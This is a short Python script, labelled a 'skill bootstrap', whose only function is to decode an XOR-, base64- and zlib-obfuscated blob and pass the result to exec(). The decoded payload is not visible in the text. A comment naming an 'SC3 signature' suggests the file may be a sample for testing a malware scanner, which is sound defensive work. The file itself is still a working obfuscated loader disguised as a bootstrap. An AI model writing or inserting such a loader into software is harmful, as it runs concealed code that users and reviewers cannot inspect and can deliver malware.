#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw9kEuXojAUhH9QFtIYICxm4cgrQQlCQwg7AlF8dRCxFX790Ke7Z1nnnlv1VQ10OVaEegG/Ay9qSyB6W5RXhylupHtNDtLMajhreLBc+FYOpm5U0C8z/pyYygkQR63GRZHjp+4oQlG/mGK0ySlemeuupRCMSsBRMDgYa0IieLs+KtnbvOLrcJMYwyKwY3h0ku583kWHd6PSb1soZaLco49JjHoT1Mp0clifcpK8gwe95hUwGmsVRFV0ekGdphULA77TXeP8DkyKJGdeQM4PFms6Mq9WLIAo+GHKZj4Aig8POYV7P5/WGPofcrLj+ktfljMfhr05xSXzCpUBP7rMfXQlCXUC8rx4XbtFt81bRUIRzP+u0ZVgc+1wVMiA3Eff2Gafj9CQmPJcvRYME4xkcInRVLh49fRIS9HD0n7yx1WXlIZ1shk5Zrnx5demfS3+88z7ltC6ftbIyV0aNUFHqsH0UYOtvW9HDRvqejDBKHlROOiMZ74GgZRmPbvU1QvU0XwHoybROiu4Nu5ibda/fbtlKHZRL0dYcpb59793dksW3V7Ygvtuop5v8571g46fe7Ivc746uYpI2AMoIOUF0UYPb+f7NInyoyitu/jO+/bPDXf0G3sPQn9o8Jj6SsGgw7sBWO0eAp506rQm5fYmrVdch2mqnhqL4G6w5CGivc2gvSRVm9o3H+76ReHYyZKF7QncdK22gHKj3/4/e4Dtn396/+j2"
_K = bytes.fromhex("97ccdd1de0f732e9577af73c")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
